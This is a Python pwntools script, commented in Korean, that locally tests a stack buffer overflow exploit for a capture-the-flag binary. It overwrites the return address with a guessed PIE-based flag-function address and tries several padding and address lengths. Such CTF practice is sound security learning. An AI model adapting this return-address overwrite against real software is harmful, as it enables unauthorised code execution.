#!/usr/bin/env python3

"""
실제 PIE 베이스로 로컬 테스트
"""

from pwn import *

def find_real_pie_base():
    """실제 PIE 베이스 주소 찾기"""
    print("[+] 실제 PIE 베이스 주소 찾기")
    print("=" * 50)
    
    # GDB로 실제 베이스 주소 확인
    p = gdb.debug('./main', '''
        b *main
        continue
        p/x $rip
        p/x $rip - 0x1229
        quit
    ''')
    
    return p

def test_with_correct_address():
    """정확한 주소로 테스트"""
    print("[+] 정확한 주소로 테스트")
    print("=" * 50)
    
    # 추정 PIE 베이스 (일반적인 값)
    pie_base = 0x555555554000
    flag_func_addr = pie_base + 0x1339
    
    print(f"PIE 베이스: 0x{pie_base:x}")
    print(f"플래그 함수: 0x{flag_func_addr:x}")
    
    # 6바이트 주소 사용 (NULL 바이트 제거)
    addr_bytes = p64(flag_func_addr)[:6]
    print(f"6바이트 주소: {addr_bytes.hex()}")
    
    # ASCII 호환성 확인
    for i, b in enumerate(addr_bytes):
        is_ascii = 0x20 < b < 0x7f
        char = chr(b) if is_ascii else '?'
        print(f"바이트 {i}: 0x{b:02x} ({char}) - {'✅' if is_ascii else '❌'}")
    
    # 페이로드 구성
    payload = b"A" * 16           # 버퍼
    payload += b"B" * 8           # RBP  
    payload += addr_bytes         # 6바이트 주소
    
    print(f"\n페이로드 길이: {len(payload)}")
    print(f"페이로드: {payload}")
    
    try:
        p = process('./main')
        p.sendline(payload)
        output = p.recvall(timeout=3)
        print(f"결과: {output}")
        
        if b'DH{' in output:
            print("🎉🎉🎉 성공! 플래그 발견!")
        else:
            print("플래그 함수 호출했지만 플래그 출력 안됨")
        
        p.close()
        
    except Exception as e:
        print(f"오류: {e}")

def test_different_lengths():
    """다양한 길이로 테스트"""
    print("\n[+] 다양한 길이로 테스트")
    print("=" * 50)
    
    pie_base = 0x555555554000
    flag_func_addr = pie_base + 0x1339
    
    # 다양한 길이의 주소 테스트
    for addr_len in [1, 2, 3, 4, 5, 6, 8]:
        addr_bytes = p64(flag_func_addr)[:addr_len]
        
        # ASCII 체크
        all_ascii = all(0x20 < b < 0x7f for b in addr_bytes)
        
        if not all_ascii:
            print(f"{addr_len}바이트: ASCII 비호환 - 건너뜀")
            continue
        
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        print(f"\n{addr_len}바이트 주소 테스트:")
        print(f"주소: {addr_bytes.hex()}")
        print(f"페이로드 길이: {len(payload)}")
        
        try:
            p = process('./main')
            p.sendline(payload)
            output = p.recvall(timeout=2)
            print(f"결과: {output}")
            
            if b'DH{' in output:
                print(f"🎉 성공! {addr_len}바이트 주소로 플래그 획득!")
                return True
            
            p.close()
            
        except Exception as e:
            print(f"오류: {e}")
    
    return False

def test_stack_alignment():
    """스택 정렬 테스트"""
    print("\n[+] 스택 정렬 테스트")
    print("=" * 50)
    
    pie_base = 0x555555554000
    flag_func_addr = pie_base + 0x1339
    addr_bytes = p64(flag_func_addr)[:6]
    
    # 다양한 패딩으로 스택 정렬 시도
    for padding in range(14, 20):
        payload = b"A" * padding + b"B" * (24 - padding) + addr_bytes
        
        print(f"\n패딩 {padding}바이트 테스트:")
        print(f"페이로드 길이: {len(payload)}")
        
        try:
            p = process('./main')
            p.sendline(payload)
            output = p.recvall(timeout=2)
            print(f"결과 길이: {len(output)}")
            
            if b'DH{' in output:
                print(f"🎉 성공! 패딩 {padding}바이트로 플래그 획득!")
                print(f"플래그: {output}")
                return True
            elif len(output) > 30:  # 더 긴 응답
                print(f"흥미로운 응답: {output}")
            
            p.close()
            
        except Exception as e:
            print(f"오류: {e}")
    
    return False

if __name__ == "__main__":
    print("🎯 정확한 주소로 로컬 테스트")
    print("=" * 60)
    
    # 1. 정확한 주소로 테스트
    test_with_correct_address()
    
    # 2. 다양한 길이 테스트
    success = test_different_lengths()
    
    if not success:
        # 3. 스택 정렬 테스트
        success = test_stack_alignment()
    
    if success:
        print("\n🎉 로컬 테스트 성공!")
        print("이제 서버에 적용할 수 있습니다!")
    else:
        print("\n🤔 로컬 테스트도 실패...")
        print("추가 디버깅이 필요합니다.")
